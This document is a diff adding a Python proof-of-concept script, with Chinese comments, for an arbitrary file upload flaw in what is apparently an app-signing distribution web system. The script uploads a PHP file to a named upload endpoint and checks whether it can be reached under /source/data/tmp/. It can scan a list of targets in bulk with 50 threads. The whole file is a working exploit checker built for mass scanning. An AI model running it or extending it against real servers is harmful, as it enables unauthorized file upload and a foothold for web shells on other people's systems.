@@ -1,0 +1,60 @@
+#导包
+import requests
+import re
+import sys
+import argparse
+from multiprocessing.dummy import Pool
+import urllib3
+urllib3.disable_warnings()
+
+def banner():
+    ico = """
+.------..------..------..------..------.
+|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
+| :/\: || (\/) || :/\: || :/\: || (\/) |
+| (__) || :\/: || :\/: || (__) || :\/: |
+| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
+`------'`------'`------'`------'`------'
+
+ 
+    """
+    print(ico)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='APP签名颁发任意文件上传')
+    parser.add_argument('-u', '--url', dest='url', type=str, help='单个URL')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='批量URL文件')
+    args = parser.parse_args()
+
+    if args.url:
+        poc(args.url)
+    elif args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(50)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+#首先判断响应是否上传成功，再判断是否能访问到上传的文件
+def poc(target):
+    url = '/source/pack/upload/2upload/index-uplog.php'
+    files = {'app': ('1.php', b'<?php phpinfo();?>', 'application/x-php')} # 文件名和内容
+    # 其他表单数据
+    data = {'time': '1-2'}
+    try:
+        res = requests.post(url=target+url,files=files,data=data,verify=False,timeout=6)
+        if res.status_code==200 and '1-2' in res.text:
+            res1=requests.get(url=target+'/source/data/tmp/1-2.php',verify=False,timeout=6)
+            if res1.status_code==200:
+                print(f"[+]{target}    上传成功！！！请自行检测{target}/source/data/tmp/1-2.php")
+            else:
+                print(f"[-]{target}    上传失败")
+        else:
+            print(f"[-]{target}    不存在漏洞")
+    except:
+            pass
